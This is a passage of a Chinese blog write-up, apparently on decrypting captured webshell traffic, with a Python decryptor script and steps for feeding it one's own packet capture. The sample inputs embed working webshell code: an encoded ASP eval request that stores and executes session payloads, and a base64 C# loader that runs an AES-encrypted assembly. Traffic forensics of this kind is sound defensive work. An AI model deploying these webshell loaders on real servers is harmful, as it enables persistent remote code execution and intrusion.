QD7cSY0IjM1EzY5EGOiBTZ2M2Mn0TeltGJK0wOnQWYvxWehB3J9UWbh5EZh9Gb5FGckoQD7cSelt2J9M3chBHJK0QfK0wOERCIuJXd0VmcgACIgoQD9BCIgAiCNszYk4VXpRyWERCI9ASXpRyWERCIgACIgACIgoQD70VNxYSMrkGJbtEJg0DIjRCIgACIgACIgoQD7BSKrsSaksTKERCKuVGbyR3c8kGJ7ATPpRCKy9mZgACIgoQD7lySkwCRkgSZk92YuVGIu9Wa0Nmb1ZmCNsTKwgyZulGdy9GclJ3Xy9mcyVGQK0wOpADK0lWbpx2Xl1Wa09FdlNHQK0wOpgCdyFGdz9lbvl2czV2cApQD%27%29%29%29%29%3B&amp;amp;key=DlMRWA1cL1gOVDc2MjRhRwZFEQ%3D%3D&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    # print(data)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    # exit()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    # data = decrypter.decrypt_res_payload(b&amp;#x27;72a9c691ccdaab98fL1tMGI4YTljO/79NDQm7r9PZzBiOA==b4c4e1f6ddd2a488&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    # print(data)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    # decrypter = JAVA_AES_RAW(pass_=&amp;#x27;pass&amp;#x27;, key=&amp;#x27;3c6e0b8a9c15224a&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    # java_raw_req = &amp;#x27;d26414f92d691674f3dedb554e70202550ff681c03dcd3572f74df4c4c68d7078abb82808610aee869f51107d7d66f60&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    # java_raw_res = &amp;#x27;2c5fc8a643ef334889238c26a41b360daa0156f71b0cca70b8bee7612de7fe4e&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    # data = decrypter.decrypt_req_payload(bytes(bytearray.fromhex(java_raw_req)))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    # print(data)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    # data = decrypter.decrypt_res_payload(bytes(bytearray.fromhex(java_raw_res)))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    # print(data)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    decrypter = JAVA_AES_BASE64(pass_=&amp;#x27;pass&amp;#x27;, key=&amp;#x27;3c6e0b8a9c15224a&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    data = decrypter.decrypt_req_payload(b&amp;#x27;pass=0mQU%2BS1pFnTz3ttVTnAgJVD%2FaBwD3NNXL3TfTExo1weKu4KAhhCu6Gn1EQfX1m9g&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    print(data)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    data = decrypter.decrypt_res_payload(&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        b&amp;#x27;11CD6A8758984163LF/IpkPvM0iJI4wmpBs2DaoBVvcbDMpwuL7nYS3n/k4=6C37AC826A2A04BC&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    print(data)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    decrypter = ASP_BASE64(pass_=&amp;#x27;pass&amp;#x27;, key=&amp;#x27;3c6e0b8a9c15224a&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    data = decrypter.decrypt_req_payload(b&amp;quot;pass=bWV0aG9kTmFtZQIEAAAAdGVzdA%3D%3D&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    print(data)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    data = decrypter.decrypt_res_payload(b&amp;quot;11cd6ab2s=ac826a&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    print(data)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    decrypter = ASP_RAW(pass_=&amp;#x27;pass&amp;#x27;, key=&amp;#x27;3c6e0b8a9c15224a&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    data = decrypter.decrypt_req_payload(b&amp;quot;methodName\x02\x04\x00\x00\x00test&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    print(data)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    data = decrypter.decrypt_res_payload(b&amp;quot;ok&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    print(data)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    decrypter = ASP_EVAL_BASE64(pass_=&amp;#x27;pass&amp;#x27;, key=&amp;#x27;3c6e0b8a9c15224a&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    data = decrypter.decrypt_req_payload(b&amp;quot;pass=eval%28%22Ex%22%26cHr%28101%29%26%22cute%28%22%22Server.ScriptTimeout%3D3600%3AOn+Error+Resume+Next%3AFunction+bd%28byVal+s%29%3AFor+i%3D1+To+Len%28s%29+Step+2%3Ac%3DMid%28s%2Ci%2C2%29%3AIf+IsNumeric%28Mid%28s%2Ci%2C1%29%29+Then%3AExecute%28%22%22%22%22bd%3Dbd%26chr%28%26H%22%22%22%22%26c%26%22%22%22%22%29%22%22%22%22%29%3AElse%3AExecute%28%22%22%22%22bd%3Dbd%26chr%28%26H%22%22%22%22%26c%26Mid%28s%2Ci%2B2%2C2%29%26%22%22%22%22%29%22%22%22%22%29%3Ai%3Di%2B2%3AEnd+If%22%22%26chr%2810%29%26%22%22Next%3AEnd+Function%3AEx%22%26cHr%28101%29%26%22cute%28%22%22%22%22On+Error+Resume+Next%3A%22%22%22%22%26bd%28%22%22%22%220d0a5365742062797061737344696374696f6e617279203d205365727665722e4372656174654f626a6563742822536372697074696e672e44696374696f6e61727922290d0a0d0a46756e6374696f6e204261736536344465636f646528427956616c2076436f6465290d0a2020202044696d206f584d4c2c206f4e6f64650d0a20202020536574206f584d4c203d204372656174654f626a65637428224d73786d6c322e444f4d446f63756d656e742e332e3022290d0a20202020536574206f4e6f6465203d206f584d4c2e437265617465456c656d656e74282262617365363422290d0a202020206f4e6f64652e6461746154797065203d202262696e2e626173653634220d0a202020206f4e6f64652e74657874203d2076436f64650d0a202020204261736536344465636f6465203d206f4e6f64652e6e6f6465547970656456616c75650d0a20202020536574206f4e6f6465203d204e6f7468696e670d0a20202020536574206f584d4c203d204e6f7468696e670d0a456e642046756e6374696f6e0d0a0d0a46756e6374696f6e2064656372797074696f6e28636f6e74656e742c697342696e290d0a2020202064696d2073697a652c692c726573756c742c6b657953697a650d0a202020206b657953697a65203d206c656e286b6579290d0a202020205365742042696e61727953747265616d203d204372656174654f626a656374282241444f44422e53747265616d22290d0a2020202042696e61727953747265616d2e43686172536574203d202269736f2d383835392d31220d0a2020202042696e61727953747265616d2e54797065203d20320d0a2020202042696e61727953747265616d2e4f70656e0d0a202020206966204973417272617928636f6e74656e7429207468656e0d0a202020202020202073697a653d55426f756e6428636f6e74656e74292b310d0a2020202020202020466f7220693d3120546f2073697a650d0a20202020202020202020202042696e61727953747265616d2e57726974655465787420636872772861736362286d69646228636f6e74656e742c692c312929290d0a20202020202020204e6578740d0a20202020656e642069660d0a2020202042696e61727953747265616d2e506f736974696f6e203d20300d0a20202020696620697342696e207468656e0d0a202020202020202042696e61727953747265616d2e54797065203d20310d0a202020202020202064656372797074696f6e3d42696e61727953747265616d2e5265616428290d0a20202020656c73650d0a202020202020202064656372797074696f6e3d42696e61727953747265616d2e526561645465787428290d0a20202020656e642069660d0a0d0a456e642046756e6374696f6e0d0a20202020636f6e74656e743d726571756573742e466f726d28226b657922290d0a202020206966206e6f74204973456d70747928636f6e74656e7429207468656e0d0a0d0a2020202020202020696620204973456d7074792853657373696f6e28227061796c6f6164222929207468656e0d0a202020202020202020202020636f6e74656e743d64656372797074696f6e284261736536344465636f646528636f6e74656e74292c66616c7365290d0a20202020202020202020202053657373696f6e28227061796c6f616422293d636f6e74656e740d0a202020202020202020202020726573706f6e73652e456e640d0a2020202020202020656c73650d0a202020202020202020202020636f6e74656e743d4261736536344465636f646528636f6e74656e74290d0a20202020202020202020202062797061737344696374696f6e6172792e41646420227061796c6f6164222c53657373696f6e28227061796c6f616422290d0a202020202020202020202020457865637574652862797061737344696374696f6e61727928227061796c6f61642229290d0a202020202020202020202020726573756c743d72756e28636f6e74656e74290d0a202020202020202020202020726573706f6e73652e5772697465282238323831333022290d0a2020202020202020202020206966206e6f74204973456d70747928726573756c7429207468656e0d0a20202020202020202020202020202020726573706f6e73652e577269746520426173653634456e636f64652864656372797074696f6e28726573756c742c7472756529290d0a202020202020202020202020656e642069660d0a202020202020202020202020726573706f6e73652e5772697465282232306562626322290d0a2020202020202020656e642069660d0a20202020656e642069660d0a0d0a%22%22%22%22%29%29%3AResponse.End%22%22%29%22%29%0D%0A&amp;amp;key=bWV0aG9kTmFtZQIEAAAAdGVzdA%3D%3D&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    print(data)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    data = decrypter.decrypt_res_payload(b&amp;quot;828130b2s=20ebbc&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    print(data)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    decrypter = ASP_XOR_BASE64(pass_=&amp;#x27;pass&amp;#x27;, key=&amp;#x27;3c6e0b8a9c15224a&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    data = decrypter.decrypt_req_payload(b&amp;quot;pass=DlMRWA1cL1gOVDc2MjRhRwZFEQ%3D%3D&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    print(data)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    data = decrypter.decrypt_res_payload(b&amp;quot;11cd6aDF0=ac826a&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    print(data)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    decrypter = ASP_XOR_RAW(pass_=&amp;#x27;pass&amp;#x27;, key=&amp;#x27;3c6e0b8a9c15224a&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    asp_xor_raw_req = &amp;#x27;0e5311580d5c2f580e54373632346147064511&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    asp_xor_raw_res = &amp;#x27;0c5d&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    data = decrypter.decrypt_req_payload(bytes(bytearray.fromhex(asp_xor_raw_req)))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    print(data)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    data = decrypter.decrypt_res_payload(bytes(bytearray.fromhex(asp_xor_raw_res)))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    print(data)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    # decrypter = CSHAP_AES_BASE64(pass_=&amp;#x27;pass&amp;#x27;, key=&amp;#x27;3c6e0b8a9c15224a&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    # data = decrypter.decrypt_req_payload(b&amp;#x27;pass=&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    # print(data)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    # data = decrypter.decrypt_res_payload(b&amp;#x27;11CD6A8758984163CRF8Fju8YJWYsacdj2S9hlrsxeDHV8GSkLM/jS9ONlU=6C37AC826A2A04BC&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    # print(data)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    # decrypter = CSHAP_EVAL_AES_BASE64(pass_=&amp;#x27;pass&amp;#x27;, key=&amp;#x27;3c6e0b8a9c15224a&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    # data = decrypter.decrypt_req_payload(&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    #     b&amp;#x27;pass=eval%28System.Text.Encoding.Default.GetString%28System.Convert.FromBase64String%28HttpUtility.UrlDecode%28%27ICAgICAgICAgICAgICAgIHRyeSB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHZhciBhcHBjb250ZXh0ID0gSHR0cENvbnRleHQuQ3VycmVudDsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYXBwY29udGV4dC5BcHBsaWNhdGlvbi5SZW1vdmUoIiIpOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB2YXIga2V5ID0gIjNjNmUwYjhhOWMxNTIyNGEiOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB2YXIgcGFzcyA9ICJrZXkiOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB2YXIgY29va2llTmFtZSA9ICJzZXNzaW9uS2V5IjsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdmFyIGNvb2tpZVZhbHVlID0gYXBwY29udGV4dC5SZXF1ZXN0LkNvb2tpZXMuR2V0KGNvb2tpZU5hbWUpID09IG51bGwgPyAiIiA6IGFwcGNvbnRleHQuUmVxdWVzdC5Db29raWVzLkdldChjb29raWVOYW1lKS5WYWx1ZTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdmFyIG1kNSA9IFN5c3RlbS5CaXRDb252ZXJ0ZXIuVG9TdHJpbmcobmV3IFN5c3RlbS5TZWN1cml0eS5DcnlwdG9ncmFwaHkuTUQ1Q3J5cHRvU2VydmljZVByb3ZpZGVyKCkuQ29tcHV0ZUhhc2goU3lzdGVtLlRleHQuRW5jb2RpbmcuRGVmYXVsdC5HZXRCeXRlcyhwYXNzICsga2V5KSkpLlJlcGxhY2UoIi0iLCAiIik7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHZhciBkYXRhID0gU3lzdGVtLkNvbnZlcnQuRnJvbUJhc2U2NFN0cmluZyhhcHBjb250ZXh0LlJlcXVlc3RbcGFzc10pOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB2YXIgYXNzZW1ibHkgPSBhcHBjb250ZXh0LkFwcGxpY2F0aW9uLkdldChjb29raWVWYWx1ZSk7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIChhc3NlbWJseSA9PSBudWxsKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB2YXIgY29va2llID0gbmV3IEh0dHBDb29raWUoY29va2llTmFtZSwgU3lzdGVtLkd1aWQuTmV3R3VpZCgpLlRvU3RyaW5nKCJOIikpOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY29va2llVmFsdWUgPSBjb29raWUuVmFsdWU7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBhcHBjb250ZXh0LlJlc3BvbnNlLkNvb2tpZXMuQWRkKGNvb2tpZSk7DQogICAgICAgICAgICAgICAgCQkJCQlhc3NlbWJseSA9IFN5c3RlbS5SZWZsZWN0aW9uLkFzc2VtYmx5LkxvYWQobmV3IFN5c3RlbS5TZWN1cml0eS5DcnlwdG9ncmFwaHkuUmlqbmRhZWxNYW5hZ2VkKCkuQ3JlYXRlRGVjcnlwdG9yKFN5c3RlbS5UZXh0LkVuY29kaW5nLkRlZmF1bHQuR2V0Qnl0ZXMoa2V5KSwgU3lzdGVtLlRleHQuRW5jb2RpbmcuRGVmYXVsdC5HZXRCeXRlcyhrZXkpKS5UcmFuc2Zvcm1GaW5hbEJsb2NrKGRhdGEsIDAsIGRhdGEuTGVuZ3RoKSk7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBhcHBjb250ZXh0LkFwcGxpY2F0aW9uLlNldChjb29raWVWYWx1ZSwgYXNzZW1ibHkpOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsc2UNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdmFyIG8gPSBhc3NlbWJseS5DcmVhdGVJbnN0YW5jZSgiTFkiKTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHZhciBvdXRTdHJlYW0gPSBuZXcgU3lzdGVtLklPLk1lbW9yeVN0cmVhbSgpOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgby5FcXVhbHMob3V0U3RyZWFtKTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIG8uRXF1YWxzKGFwcGNvbnRleHQpOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgby5FcXVhbHMobmV3IFN5c3RlbS5TZWN1cml0eS5DcnlwdG9ncmFwaHkuUmlqbmRhZWxNYW5hZ2VkKCkuQ3JlYXRlRGVjcnlwdG9yKFN5c3RlbS5UZXh0LkVuY29kaW5nLkRlZmF1bHQuR2V0Qnl0ZXMoa2V5KSwgU3lzdGVtLlRleHQuRW5jb2RpbmcuRGVmYXVsdC5HZXRCeXRlcyhrZXkpKS5UcmFuc2Zvcm1GaW5hbEJsb2NrKGRhdGEsIDAsIGRhdGEuTGVuZ3RoKSk7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBvLlRvU3RyaW5nKCk7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB2YXIgciA9IG91dFN0cmVhbS5Ub0FycmF5KCk7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBvdXRTdHJlYW0uRGlzcG9zZSgpOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYXBwY29udGV4dC5SZXNwb25zZS5Xcml0ZShtZDUuU3Vic3RyaW5nKDAsIDE2KSk7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBhcHBjb250ZXh0LlJlc3BvbnNlLldyaXRlKFN5c3RlbS5Db252ZXJ0LlRvQmFzZTY0U3RyaW5nKG5ldyBTeXN0ZW0uU2VjdXJpdHkuQ3J5cHRvZ3JhcGh5LlJpam5kYWVsTWFuYWdlZCgpLkNyZWF0ZUVuY3J5cHRvcihTeXN0ZW0uVGV4dC5FbmNvZGluZy5EZWZhdWx0LkdldEJ5dGVzKGtleSksIFN5c3RlbS5UZXh0LkVuY29kaW5nLkRlZmF1bHQuR2V0Qnl0ZXMoa2V5KSkuVHJhbnNmb3JtRmluYWxCbG9jayhyLCAwLCByLkxlbmd0aCkpKTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGFwcGNvbnRleHQuUmVzcG9uc2UuV3JpdGUobWQ1LlN1YnN0cmluZygxNikpOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9DQoNCiAgICAgICAgICAgICAgICB9IGNhdGNoIChlKSB7DQogICAgICAgICAgICAgICAgfQ0K%27%29%29%29%2C%27unsafe%27%29%3B&amp;amp;key=WwSelqL9JENiXyh3FQxhh6neBpd6CFz4tFjBohtMq8pX0MY0w6%2F1Gkg4dxy5JO9o&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    # print(data)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    # data = decrypter.decrypt_res_payload(&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    #     b&amp;#x27;72A9C691CCDAAB98CRF8Fju8YJWYsacdj2S9hlrsxeDHV8GSkLM/jS9ONlU=B4C4E1F6DDD2A488&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    # print(data)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    decrypter = CSHAP_ASMX_AES_BASE64(pass_=&amp;#x27;pass&amp;#x27;, key=&amp;#x27;3c6e0b8a9c15224a&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    asmx_req = b&amp;#x27;&amp;#x27;&amp;#x27;&amp;lt;?xml version=&amp;quot;1.0&amp;quot; encoding=&amp;quot;utf-8&amp;quot;?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;lt;soap:Envelope xmlns:xsi=&amp;quot;http://www.w3.org/2001/XMLSchema-instance&amp;quot; xmlns:xsd=&amp;quot;http://www.w3.org/2001/XMLSchema&amp;quot; xmlns:soap=&amp;quot;http://schemas.xmlsoap.org/soap/envelope/&amp;quot;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &amp;lt;soap:Body&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;lt;pass xmlns=&amp;quot;http://tempuri.org/&amp;quot;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          &amp;lt;pass&amp;gt;WwSelqL9JENiXyh3FQxhh6neBpd6CFz4tFjBohtMq8pX0MY0w6%2F1Gkg4dxy5JO9o&amp;lt;/pass&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;lt;/pass&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &amp;lt;/soap:Body&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;lt;/soap:Envelope&amp;gt;&amp;#x27;&amp;#x27;&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    asmx_res = b&amp;#x27;&amp;#x27;&amp;#x27;&amp;lt;?xml version=&amp;quot;1.0&amp;quot; encoding=&amp;quot;utf-8&amp;quot;?&amp;gt;&amp;lt;soap:Envelope xmlns:soap=&amp;quot;http://schemas.xmlsoap.org/soap/envelope/&amp;quot; xmlns:xsi=&amp;quot;http://www.w3.org/2001/XMLSchema-instance&amp;quot; xmlns:xsd=&amp;quot;http://www.w3.org/2001/XMLSchema&amp;quot;&amp;gt;&amp;lt;soap:Body&amp;gt;&amp;lt;passResponse xmlns=&amp;quot;http://tempuri.org/&amp;quot;&amp;gt;&amp;lt;passResult&amp;gt;11CD6A8758984163CRF8Fju8YJWYsacdj2S9hlrsxeDHV8GSkLM/jS9ONlU=6C37AC826A2A04BC&amp;lt;/passResult&amp;gt;&amp;lt;/passResponse&amp;gt;&amp;lt;/soap:Body&amp;gt;&amp;lt;/soap:Envelope&amp;gt;&amp;#x27;&amp;#x27;&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    data = decrypter.decrypt_req_payload(asmx_req)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    print(data)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    data = decrypter.decrypt_res_payload(asmx_res)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    print(data)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    # decrypter = CSHAP_AES_RAW(pass_=&amp;#x27;pass&amp;#x27;, key=&amp;#x27;3c6e0b8a9c15224a&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    # cshap_aes_raw_req=&amp;#x27;5b049e96a2fd2443625f2877150c6187a9de06977a085cf8b458c1a21b4cabca57d0c634c3aff51a4838771cb924ef68&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    # cshap_aes_raw_res = &amp;#x27;09117c163bbc609598b1a71d8f64bd865aecc5e0c757c19290b33f8d2f4e3655&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    # data = decrypter.decrypt_req_payload(bytes(bytearray.fromhex(cshap_aes_raw_req)))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    # print(data)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    # data = decrypter.decrypt_res_payload(bytes(bytearray.fromhex(cshap_aes_raw_res)))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    # print(data)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;找到如下模块并写入自己抓取流量包的数据（注意代码前方的缩进）&lt;br&gt;
&lt;img data-src=&#34;https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/YgxVz9UGNO1EI7iG.png!thumbnail&#34; alt=&#34;&#34; title=&#34;fig:&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/TKeBzCkFRK0nZYVX.png!thumbnail&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;运行能够看到解密出来的代码&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/E53uurH7zQWXkpa1.png!thumbnail&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;给它整理一下&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span 